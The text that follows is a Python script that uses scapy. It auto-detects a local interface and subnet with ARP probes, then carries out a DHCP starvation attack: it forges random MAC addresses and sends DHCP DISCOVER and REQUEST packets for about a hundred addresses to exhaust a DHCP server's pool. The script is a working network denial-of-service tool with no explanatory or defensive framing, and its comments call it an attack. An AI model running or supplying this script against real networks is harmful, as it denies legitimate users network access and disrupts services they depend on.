#!usr/bin/env python
import asyncio
import sys
import os
import time
import socket
import ipaddress
from scapy.all import *


def get_network_info_using_arp():
    """
    Determine most effective network interface using ARP probing
    Returns: (interface_name, subnet)
    """
    # Get all network interfaces
    interfaces = get_if_list()
    best_iface = None
    subnet = None
    best_response_count = 0
    
    for iface in interfaces:
        # Skip loopback interfaces
        if iface == 'lo' or 'loopback' in iface.lower():
            continue
        
        try:
            # Get IP address of interface
            ip = get_if_addr(iface)
            if ip == '0.0.0.0' or not ip:
                continue
                
            
            
            # Get subnet prefix for ARP scanning
            subnet_parts = ip.split('.')
            subnet_prefix = f"{subnet_parts[0]}.{subnet_parts[1]}.{subnet_parts[2]}."
            
            print(f"Testing interface {iface} with IP {ip}")
            
            # Test interface with ARP requests to common addresses
            response_count = 0
            
            # Try gateway (usually .1) and a few other common hosts
            test_ips = [f"{subnet_prefix}1", f"{subnet_prefix}2", f"{subnet_prefix}254"]
            
            # Add the interface's own IP for validation
            if ip not in test_ips:
                test_ips.append(ip)
            
            # Send ARP requests on this interface
            for test_ip in test_ips:
                # Only test addresses within our subnet
                
                try:
                    # Set the test interface explicitly
                    conf.iface = iface
                        
                    # Create and send ARP request
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=test_ip)
                    response, unanswered = srp(arp_request, timeout=1, verbose=0)
                        
                    # Count responses
                    if response:
                        response_count += len(response)
                        print(f"  - Got ARP response from {test_ip}")
                        break
                except Exception as e:
                    print(f"  - Error testing {test_ip}: {e}")
            
            print(f"  - Interface {iface} received {response_count} ARP responses")
            
            # If this interface has more responses, it's likely more "effective"
            if response_count > best_response_count:
                best_response_count = response_count
                best_iface = iface
                subnet = subnet_prefix
                
        except Exception as e:
            print(f"Error processing interface {iface}: {e}")
            continue
    
    # If no suitable interface found with ARP, fall back to default method
    if not best_iface or best_response_count == 0:
        print("No interfaces responded to ARP. Falling back to default method.")
        return fallback_get_network_info()
    
    print(f"Selected best interface: {best_iface} with {best_response_count} ARP responses")
    return best_iface, subnet


def fallback_get_network_info():
    """Fallback method if ARP-based detection fails"""
    interfaces = get_if_list()
    best_iface = None
    subnet = None
    
    for iface in interfaces:
        if iface == 'lo' or 'loopback' in iface.lower():
            continue
        
        try:
            ip = get_if_addr(iface)
            if ip and ip != '0.0.0.0':
                netmask = get_if_netmask(iface)
                if netmask:
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    subnet_parts = str(network.network_address).split('.')
                    subnet_prefix = f"{subnet_parts[0]}.{subnet_parts[1]}.{subnet_parts[2]}."
                    
                    best_iface = iface
                    subnet = subnet_prefix
                    break
        except Exception:
            continue
    
    # Default fallback
    if not best_iface or not subnet:
        best_iface = conf.iface
        subnet = "10.0.0."
    
    return best_iface, subnet


async def main():
    layer2_broadcast = "ff:ff:ff:ff:ff:ff"
    conf.checkIPaddr = False
    
    # Use ARP to determine the most effective interface and subnet
    iface, IP_address_subnet = get_network_info_using_arp()
    print(f"Using interface: {iface}")
    print(f"Using subnet: {IP_address_subnet}")

    # Use the detected interface for sending packets
    conf.iface = iface

    async def dhcp_starvation():
        for ip in range(100, 200):
            # Generate a unique MAC address for this attempt
            bogus_mac_address = RandMAC()
            # Generate a random transaction ID
            xid = random.randint(1, 900000000)
            
            # Step 1: Send DHCP Discover
            print(f"Sending DHCP DISCOVER for {bogus_mac_address}")
            discover = Ether(dst=layer2_broadcast, src=bogus_mac_address)/\
                      IP(src="0.0.0.0", dst="255.255.255.255")/\
                      UDP(sport=68, dport=67)/\
                      BOOTP(chaddr=mac2str(bogus_mac_address), xid=xid)/\
                      DHCP(options=[("message-type", "discover"), "end"])
            
            sendp(discover, verbose=0)
            time.sleep(1)  # Give server time to respond
            
            # Step 2: Send DHCP Request (pretending we received an offer)
            print(f"Sending DHCP REQUEST for {IP_address_subnet}{ip} from {bogus_mac_address}")
            request = Ether(dst=layer2_broadcast, src=bogus_mac_address)/\
                     IP(src="0.0.0.0", dst="255.255.255.255")/\
                     UDP(sport=68, dport=67)/\
                     BOOTP(chaddr=mac2str(bogus_mac_address), xid=xid)/\
                     DHCP(options=[
                         ("message-type", "request"),
                         ("requested_addr", IP_address_subnet + str(ip)),
                         ("server_id", IP_address_subnet + "1"),  # Assume DHCP server is at .1
                         "end"
                      ])
            
            sendp(request, verbose=0)
            print(f"Requested: {IP_address_subnet}{ip}")
            time.sleep(2)  # Pause between attempts to avoid overloading
            
            # Optional: Try to listen for responses to verify if our attack is working
            # This can help detect if packets are being filtered
            try:
                sniff_filter = f"udp and port 67 and port 68"
                response_packets = sniff(iface=iface, filter=sniff_filter, timeout=1)
                if response_packets:
                    print(f"Received {len(response_packets)} DHCP response packets")
            except Exception as e:
                print(f"Error sniffing for responses: {e}")
    
    await dhcp_starvation()

if __name__ == "__main__":
    asyncio.run(main())